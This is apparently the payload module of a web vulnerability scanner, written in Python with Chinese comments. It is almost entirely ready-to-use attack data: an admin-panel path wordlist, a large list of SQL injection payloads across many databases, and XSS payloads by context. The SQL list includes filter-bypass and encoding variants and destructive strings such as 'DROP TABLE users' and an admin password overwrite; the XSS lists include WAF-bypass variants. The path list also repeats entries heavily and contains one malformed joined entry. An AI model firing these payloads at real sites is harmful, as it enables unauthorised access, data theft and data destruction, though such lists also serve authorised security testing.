"""Static payloads and configuration data."""

from .runtime import print_error


ADMIN_PATHS = [
    'admin', 'admin/', 'admin.php', 'admin.html', 'admin.asp', 'admin.aspx',
    'administrator', 'administrator/', 'administrator.php',
    'manage', 'manage/', 'manage.php', 'management', 'management/',
    'backend', 'backend/', 'backend.php',
    'login', 'login/', 'login.php', 'login.html', 'login.asp',
    'wp-admin', 'wp-admin/', 'wp-login.php',
    'phpmyadmin', 'phpmyadmin/', 'pma/',
    'admin_area', 'admin_area/', 'adminarea',
    'control', 'control/', 'controlpanel', 'cp/',
    'system', 'system/', 'sys/', 'sysadmin',
    'webadmin', 'webadmin/', 'web_admin',
    'admin1', 'admin2', 'admin3', 'admin4', 'admin5',
    'moderator', 'webmaster', 'operator',
    'admin/index.php', 'admin/login.php', 'admin/admin.php',
    'admin/account.php', 'admin/admin_login.php',
    'admin_area/admin.php', 'admin_area/login.php',
    'siteadmin/login.php', 'siteadmin/index.php',
    'admin/controlpanel.php', 'admin.asp', 'admin/admin-login.php',
    'admin-login.php', 'admin/cp.php', 'cp.php',
    'administrator/index.php', 'administrator/login.php',
    'nsw/admin/login.php', 'webadmin/login.php',
    'admin/admin_login.php', 'admin_login.php',
    'administrator_login.php', 'moderator.php',
    'moderator/login.php', 'moderator/admin.php',
    'account.php', 'controlpanel.php', 'admincontrol.php',
    'admin_login.asp', 'admin/account.html', 'modelsearch/login.php',
    'moderator/login.php', 'adminarea/admin.html',
    'modules/admin/admin.php', 'adminarea/login.html',
    'admin/account.html', 'admin/index.html', 'admin/login.html',
    'admin/admin.html', 'admin_area/index.php', 'bb-admin/index.php',
    'bb-admin/login.php', 'bb-admin/admin.php', 'admin/home.php',
    'admin_area/login.php', 'admin_area/index.php',
    'admin/controlpanel.html', 'admin.html', 'admin/cp.html',
    'cp.html', 'adminpanel.html', 'webadmin.html',
    'webadmin/index.html', 'webadmin/admin.html',
    'webadmin/login.html', 'admin/admin_login.html',
    'admin_login.html', 'panel-administracion/login.html',
    'admin/cp.php', 'cp.php', 'administrator/index.php',
    'administrator/login.php', 'nsw/admin/login.php',
    'webadmin/login.php', 'admin/admin_login.php',
    'admin_login.php', 'administrator_login.php',
    'moderator.php', 'moderator/login.php', 'moderator/admin.php',
    'account.php', 'controlpanel.php', 'admincontrol.php',
    'rcjakar/admin/login.php', 'adminarea/admin.php',
    'adminarea/login.php', 'webadmin.php', 'webadmin/index.php',
    'webadmin/admin.php', 'admin/controlpanel.php',
    'admin.php', 'admincp/index.asp', 'admincp/login.asp',
    'admincp/index.html', 'admin/account.html',
    'adminpanel.html', 'webadmin.html', 'webadmin/index.html',
    'webadmin/admin.html', 'webadmin/login.html',
    'admin/admin_login.html', 'admin_login.html',
    'panel-administracion/login.html', 'admin/cp.php',
    'cp.php', 'administrator/index.php', 'administrator/login.php',
    'nsw/admin/login.php', 'webadmin/login.phpadmin/admin_login.php',
    'admin_login.php', 'administrator_login.php', 'moderator.php',
    'moderator/login.php', 'moderator/admin.php', 'account.php',
    'controlpanel.php', 'admincontrol.php', 'admin_login.asp',
    'admin/account.html', 'modelsearch/login.php',
    'moderator/login.php', 'adminarea/admin.html',
    'modules/admin/admin.php', 'adminarea/login.html',
    'admin/account.html', 'admin/index.html', 'admin/login.html',
    'admin/admin.html', 'admin_area/index.php', 'bb-admin/index.php',
    'bb-admin/login.php', 'bb-admin/admin.php', 'admin/home.php',
    'admin_area/login.php', 'admin_area/index.php',
    'admin/controlpanel.html', 'admin.html', 'admin/cp.html',
    'cp.html', 'adminpanel.html', 'webadmin.html',
    'webadmin/index.html', 'webadmin/admin.html',
    'webadmin/login.html', 'admin/admin_login.html',
    'admin_login.html', 'panel-administracion/login.html'
]

SQL_PAYLOADS = [
    "'", '"', "1' OR '1'='1", '1" OR "1"="1', "1' OR 1=1--", '1" OR 1=1--',
    "1' OR 1=1#", '1" OR 1=1#', "1' OR 1=1/*", '1" OR 1=1/*',
    "admin'--", 'admin"--', "admin'#", 'admin"#',
    "' OR 'x'='x", '" OR "x"="x', "' OR 'a'='a", '" OR "a"="a',
    "1' UNION SELECT 1,2,3--", '1" UNION SELECT 1,2,3--',
    "1' UNION SELECT 1,2,3,4--", '1" UNION SELECT 1,2,3,4--',
    "1' UNION SELECT 1,2,3,4,5--", '1" UNION SELECT 1,2,3,4,5--',
    "1' UNION SELECT null,null,null--", '1" UNION SELECT null,null,null--',
    "1' UNION ALL SELECT 1,2,3--", '1" UNION ALL SELECT 1,2,3--',
    "1' UNION SELECT user(),database(),version()--",
    '1" UNION SELECT user(),database(),version()--',
    "1' UNION SELECT @@version,@@datadir,@@hostname--",
    '1" UNION SELECT @@version,@@datadir,@@hostname--',
    "1' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
    "1' AND (SELECT SUBSTRING(@@version,1,1))='5'--",
    "1' OR SLEEP(5)--", "1' AND SLEEP(5)--", "1' OR SLEEP(3)--",
    "1' OR BENCHMARK(1000000,MD5(1))--", "1' AND BENCHMARK(5000000,MD5(1))--",
    "1' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
    "1' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e))--",
    "1' AND UPDATEXML(1,CONCAT(0x7e,(SELECT version()),0x7e),1)--",
    "1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT user()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
    "1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT database()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
    "1' AND ROW(1,1)>(SELECT COUNT(*),CONCAT(CHAR(95),CHAR(33),CHAR(64),CHAR(52),CHAR(100),CHAR(105),CHAR(108),CHAR(101),CHAR(109),CHAR(109),CHAR(97),version(),CHAR(95),CHAR(33),CHAR(64),CHAR(52),CHAR(100),CHAR(105),CHAR(108),CHAR(101),CHAR(109),CHAR(109),CHAR(97),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)--",
    "1'; SELECT pg_sleep(5)--", '1"; SELECT pg_sleep(5)--',
    "1' AND (SELECT COUNT(*) FROM pg_tables)>0--",
    "1' AND (SELECT version())='PostgreSQL'--",
    "1' UNION SELECT version(),current_database(),current_user()--",
    "1' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END)--",
    "1' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=current_database())>0--",
    "1' WAITFOR DELAY '00:00:05'--", "1'; WAITFOR DELAY '00:00:05'--",
    '1" WAITFOR DELAY "00:00:05"--', '1"; WAITFOR DELAY "00:00:05"--',
    "1' AND (SELECT COUNT(*) FROM sysobjects)>0--",
    "1' AND (SELECT @@version)='Microsoft SQL Server'--",
    "1' UNION SELECT @@version,@@servername,db_name()--",
    "1' AND (SELECT CASE WHEN (1=1) THEN 1 ELSE 1/0 END)=1--",
    "1' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_catalog=db_name())>0--",

    # Oracle特定载荷
    "1' AND (SELECT COUNT(*) FROM all_tables)>0--",
    "1' AND (SELECT banner FROM v$version WHERE rownum=1)='Oracle'--",
    "1' UNION SELECT banner,null,null FROM v$version WHERE rownum=1--",
    "1' AND (SELECT CASE WHEN (1=1) THEN 1 ELSE 1/0 END FROM dual)=1--",
    "1' AND (SELECT COUNT(*) FROM user_tables)>0--",
    "1' AND DBMS_PIPE.RECEIVE_MESSAGE(CHR(65)||CHR(66)||CHR(67),5)=1--",

    # SQLite特定载荷
    "1' AND (SELECT COUNT(*) FROM sqlite_master)>0--",
    "1' AND (SELECT sqlite_version())='3'--",
    "1' UNION SELECT sqlite_version(),null,null--",
    "1' AND (SELECT COUNT(*) FROM sqlite_master WHERE type='table')>0--",

    # 盲注载荷
    "1' AND ASCII(SUBSTRING((SELECT database()),1,1))>64--",
    "1' AND ASCII(SUBSTRING((SELECT user()),1,1))>64--",
    "1' AND LENGTH((SELECT database()))>0--",
    "1' AND LENGTH((SELECT user()))>0--",
    "1' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database())>0--",
    "1' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_schema=database())>0--",

    # 时间盲注载荷
    "1' AND IF(1=1,SLEEP(5),0)--", "1' AND IF(1=2,SLEEP(5),0)--",
    "1' AND (SELECT CASE WHEN (1=1) THEN SLEEP(5) ELSE 0 END)--",
    "1' AND (SELECT CASE WHEN (ASCII(SUBSTRING((SELECT database()),1,1))>64) THEN SLEEP(5) ELSE 0 END)--",

    # 错误注入载荷
    "1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
    "1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(user(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
    "1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(database(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
    "1' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT user()),0x7e))--",
    "1' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT database()),0x7e))--",
    "1' AND UPDATEXML(1,CONCAT(0x7e,(SELECT user()),0x7e),1)--",
    "1' AND UPDATEXML(1,CONCAT(0x7e,(SELECT database()),0x7e),1)--",

    # 绕过过滤载荷
    "1/**/OR/**/1=1--", "1/**/UNION/**/SELECT/**/1,2,3--",
    "1%20OR%201=1--", "1%20UNION%20SELECT%201,2,3--",
    "1+OR+1=1--", "1+UNION+SELECT+1,2,3--",
    "1'/**/OR/**/1=1--", "1'/**/UNION/**/SELECT/**/1,2,3--",
    "1'%20OR%201=1--", "1'%20UNION%20SELECT%201,2,3--",
    "1'+OR+1=1--", "1'+UNION+SELECT+1,2,3--",
    "1'||'1'='1", "1'||'a'='a", "1'||(SELECT version())--",

    # 二次注入载荷
    "admin'||'test", 'admin"||"test', "admin'+'test", 'admin"+"test',
    "admin'||(SELECT version())--", 'admin"||(SELECT version())--',

    # NoSQL注入载荷
    "'; return true; var x=''", '"; return true; var x=""',
    "'; return this.username == 'admin'; var x=''",
    "'; return /.*/.test(this.username); var x=''",
    "[$ne]", "[$regex]", "[$where]", "[$gt]", "[$lt]",
    "'; DROP TABLE users--", '"; DROP TABLE users--',
    "'; DELETE FROM users--", '"; DELETE FROM users--',
    "'; INSERT INTO users VALUES('hacker','password')--",
    "'; UPDATE users SET password='hacked' WHERE username='admin'--",
    "1' AND 1=1--", "1' AND 1=2--", "1' OR 1=1--", "1' OR 1=2--",
    "1' AND 'a'='a'--", "1' AND 'a'='b'--", "1' OR 'a'='a'--", "1' OR 'a'='b'--",
    "1' AND true--", "1' AND false--", "1' OR true--", "1' OR false--",
    "1' HAVING 1=1--", "1' GROUP BY 1--", "1' ORDER BY 1--",
    "1' LIMIT 1--", "1' OFFSET 1--"
]

ADVANCED_SQL_PAYLOADS = [
    "1' AND (SELECT SLEEP(5))-- -",
    "1' AND (SELECT pg_sleep(5))-- -",
    "1' AND WAITFOR DELAY '0:0:5'-- -",
    "1' AND (SELECT COUNT(*) FROM (SELECT 1 UNION SELECT 2 UNION SELECT 3) t WHERE SLEEP(5))-- -",
    "1' AND (SELECT SUBSTRING(@@version,1,1))='5'-- -",
    "1' AND (SELECT ASCII(SUBSTRING(database(),1,1)))>64-- -",
    "1' AND (SELECT LENGTH(database()))>0-- -",
    "1' AND (SELECT COUNT(*) FROM information_schema.tables)>0-- -",
    "1' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version),0x7e))-- -",
    "1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT @@version),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -",
    "1' AND updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)-- -",
    "1' AND 1=CAST((SELECT @@version) AS INT)-- -",
    "1' UNION SELECT NULL,@@version,NULL-- -",
    "1' UNION SELECT 1,2,3,4,5-- -",
    "1' UNION SELECT NULL,NULL,NULL-- -",
    "1' UNION ALL SELECT NULL,NULL,NULL-- -",
    "1'; SELECT @@version-- -",
    "1'; INSERT INTO test VALUES(1)-- -",
    "1'; UPDATE test SET id=1-- -",
    "1'; DELETE FROM test WHERE id=1-- -",
    "1'/**/AND/**/1=1-- -",
    "1'/*!50000AND*/1=1-- -",
    "1'%20AND%201=1-- -",
    "1'+AND+1=1-- -",
    "1'/*comment*/AND/*comment*/1=1-- -",

    # 编码绕过载荷
    "1'%41%4E%44%20%31%3D%31-- -",  # URL编码
    "1'\\x41\\x4E\\x44\\x20\\x31\\x3D\\x31-- -",  # 十六进制编码
    "1'CHAR(65,78,68,32,49,61,49)-- -",  # CHAR编码

    # 数据库特定载荷
    # MySQL
    "1' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -",
    "1' AND ROW(1,1)>(SELECT COUNT(*),CONCAT(CHAR(95,33,64,52,95),(SELECT (ELT(1=1,1))),CHAR(95,33,64,52,95),FLOOR(RAND(0)*2))x FROM (SELECT 1 UNION SELECT 2)a GROUP BY x LIMIT 1)-- -",

    # PostgreSQL
    "1' AND 1=cast(version() as numeric)-- -",
    "1' AND 1=(SELECT 1 FROM pg_class)::int-- -",

    # MSSQL
    "1' AND 1=CONVERT(INT,(SELECT @@version))-- -",
    "1' AND 1=CAST((SELECT @@version) AS INT)-- -",

    # Oracle
    "1' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE rownum=1))-- -",
    "1' AND 1=UTL_INADDR.GET_HOST_NAME((SELECT banner FROM v$version WHERE rownum=1))-- -",

    # SQLite
    "1' AND 1=CAST((SELECT sqlite_version()) AS INTEGER)-- -",
    "1' AND 1=(SELECT COUNT(*) FROM sqlite_master)-- -"
]

ADVANCED_XSS_PAYLOADS = {
    'script_context': [
        "</script><script>alert('XSS')</script>",
        "';alert('XSS');//",
        '";alert("XSS");//',
        "</script><img src=x onerror=alert('XSS')>",
        "</script><svg onload=alert('XSS')>"
    ],
    'attribute_context': [
        "'onmouseover='alert(1)'",
        '"onmouseover="alert(1)"',
        "javascript:alert('XSS')",
        "'autofocus onfocus='alert(1)'",
        '"autofocus onfocus="alert(1)"'
    ],
    'html_context': [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>",
        "<iframe src=javascript:alert('XSS')></iframe>",
        "<details open ontoggle=alert('XSS')>"
    ],
    'url_context': [
        "javascript:alert('XSS')",
        "data:text/html,<script>alert('XSS')</script>",
        "vbscript:msgbox('XSS')"
    ],
    'bypass_waf': [
        "<ScRiPt>alert('XSS')</ScRiPt>",
        "<img src=x onerror=\"alert('XSS')\">",
        "<svg/onload=alert('XSS')>",
        "<iframe srcdoc=\"<script>alert('XSS')</script>\"></iframe>",
        "<math><mi//xlink:href=\"data:x,<script>alert('XSS')</script>\"></mi></math>"
    ]
}

VERIFICATION_PAYLOADS = {
    'basic_alert': "<script>alert('VERIFIED_XSS_' + Math.random())</script>",
    'dom_write': "<script>document.write('VERIFIED_XSS_' + new Date().getTime())</script>",
    'console_log': "<script>console.log('VERIFIED_XSS_' + Math.random())</script>",
    'img_onerror': "<img src=x onerror=\"this.src='data:image/svg+xml,<svg xmlns=\"http://www.w3.org/2000/svg\"><text>VERIFIED_XSS</text></svg>'\">",
    'svg_onload': "<svg onload=\"this.innerHTML='<text>VERIFIED_XSS_' + Math.random() + '</text>'\">"
}

XSS_PAYLOADS = [
    # 基础XSS载荷
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg onload=alert('XSS')>",
    "javascript:alert('XSS')",
    "<iframe src=javascript:alert('XSS')></iframe>",
    "<body onload=alert('XSS')>",
    "<input onfocus=alert('XSS') autofocus>",
    "<select onfocus=alert('XSS') autofocus>",
    "<textarea onfocus=alert('XSS') autofocus>",
    "<video><source onerror=alert('XSS')>",
    "<audio src=x onerror=alert('XSS')>",
    "<details open ontoggle=alert('XSS')>",
    "<marquee onstart=alert('XSS')>",
    "'\">"
    "<script>alert('XSS')</script>",
    "'><img src=x onerror=alert('XSS')>",
    "\"'><script>alert('XSS')</script>",
    "%3Cscript%3Ealert('XSS')%3C/script%3E",
    "&lt;script&gt;alert('XSS')&lt;/script&gt;",
    "<script>alert(String.fromCharCode(88,83,83))</script>"
]

def load_custom_payloads(file_path):
    """从文件加载自定义载荷"""
    try:
        with open(file_path, 'r', encoding='utf-8') as f:
            return [line.strip() for line in f if line.strip()]
    except Exception as e:
        print_error(f"无法加载自定义载荷文件：{type(e).__name__}")
    return []
